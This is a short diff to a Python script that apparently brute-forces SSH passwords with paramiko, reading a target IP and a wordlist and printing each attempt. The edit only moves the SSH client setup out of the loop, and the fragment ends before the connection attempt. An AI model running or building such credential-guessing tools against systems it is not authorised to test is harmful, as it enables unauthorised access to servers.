@@ -5,11 +5,10 @@ import paramiko
 ip_addr = sys.argv[1]
 file_name = sys.argv[2]
 counter = 1
-
+client = paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 with open(f"{file_name}", "r") as wordlist:
     for line in wordlist:
-        client = paramiko.SSHClient()
-        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         print(f"Probing password on line {counter}")
         counter += 1
         try:
